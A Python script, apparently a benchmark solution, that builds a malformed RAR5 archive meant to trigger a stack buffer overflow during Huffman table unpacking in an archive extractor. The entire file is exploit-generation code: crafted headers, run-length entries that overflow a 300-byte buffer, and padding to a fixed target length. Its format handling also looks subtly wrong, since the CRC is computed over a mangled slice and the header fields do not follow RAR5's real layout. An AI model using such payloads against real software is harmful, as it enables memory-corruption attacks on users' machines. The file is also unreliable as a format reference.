import os
import struct
import tempfile
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal valid RAR5 archive with Huffman table overflow
        # RAR5 signature
        signature = b'Rar!\x1a\x07\x01\x00'
        
        # Archive header (type 1)
        archive_header = struct.pack('<BI', 0x01, 0x00000000)  # crc32 placeholder
        
        # Calculate archive header CRC
        import zlib
        crc = zlib.crc32(archive_header[4:]) & 0xFFFFFFFF
        archive_header = struct.pack('<I', crc) + archive_header[4:]
        
        # File header (type 2) with Huffman table
        # We'll create a file header that triggers the buffer overflow
        # during Huffman table parsing
        
        # Prepare malicious compressed data with Huffman table
        # The vulnerability occurs when unpacking Huffman tables with RLE
        # We need to create a table that overflows the stack buffer
        
        # Compressed block structure:
        # 1. Block type = 4 (compressed file)
        # 2. Block flags = 0x8001 (has data, extended flags)
        # 3. Block size
        # 4. Additional data
        
        # Create Huffman table that will overflow
        # The table uses RLE-like encoding where:
        # - Each entry is 2 bytes: [count][value]
        # - count=0 means 256 repetitions
        # - Insufficient bounds checking allows overflow
        
        # We'll create enough entries to overflow the 300-byte buffer
        # Each entry writes count bytes, so we need >300 bytes total
        
        huffman_table = bytearray()
        
        # Create entries that will overflow the buffer
        # Use count=0 (means 256) to write large chunks
        overflow_needed = 524  # Ground-truth length
        bytes_written = 0
        
        # Add entries until we reach overflow size
        while bytes_written < overflow_needed - 100:  # Leave room for headers
            # Each entry: [count][symbol]
            # Use count=0xFF (255) then count=0x00 (256) to maximize writes
            if bytes_written == 0:
                # First entry: normal count
                huffman_table.append(0x50)  # Count
                huffman_table.append(0x01)  # Symbol
                bytes_written += 0x50
            else:
                # Use count=0 for 256 bytes
                huffman_table.append(0x00)  # Count=0 means 256
                huffman_table.append(0x02)  # Symbol
                bytes_written += 256
        
        # Ensure we have at least the ground-truth length
        padding = overflow_needed - len(huffman_table) - 100
        if padding > 0:
            huffman_table.extend(b'\x00' * padding)
        
        # Build file header
        file_header = bytearray()
        
        # Block header
        file_header.extend(struct.pack('<H', 0x8001))  # Flags
        file_header.extend(struct.pack('<H', 0x0004))  # Block type: compressed file
        
        # File attributes
        file_header.extend(struct.pack('<Q', 0))  # Unpacked size placeholder
        file_header.extend(struct.pack('<Q', len(huffman_table)))  # Packed size
        file_header.extend(struct.pack('<I', 0))  # File CRC placeholder
        file_header.extend(struct.pack('<H', 0))  # Date
        file_header.extend(struct.pack('<H', 0))  # Time
        file_header.extend(struct.pack('<B', 0x30))  # Version needed
        
        # File name
        filename = b"poc.txt"
        file_header.extend(struct.pack('<H', len(filename)))
        file_header.extend(filename)
        
        # Add Huffman table data
        compressed_data = huffman_table
        
        # Update packed size in header
        packed_size = len(compressed_data)
        struct.pack_into('<Q', file_header, 12, packed_size)
        
        # Calculate file header CRC
        header_crc = zlib.crc32(file_header) & 0xFFFFFFFF
        full_header = struct.pack('<I', header_crc) + file_header
        
        # Build final archive
        archive = bytearray()
        archive.extend(signature)
        archive.extend(archive_header)
        archive.extend(full_header)
        archive.extend(compressed_data)
        
        # Ensure exact ground-truth length
        if len(archive) < overflow_needed:
            # Pad with zeros if needed
            archive.extend(b'\x00' * (overflow_needed - len(archive)))
        elif len(archive) > overflow_needed:
            # Truncate if too long
            archive = archive[:overflow_needed]
        
        return bytes(archive)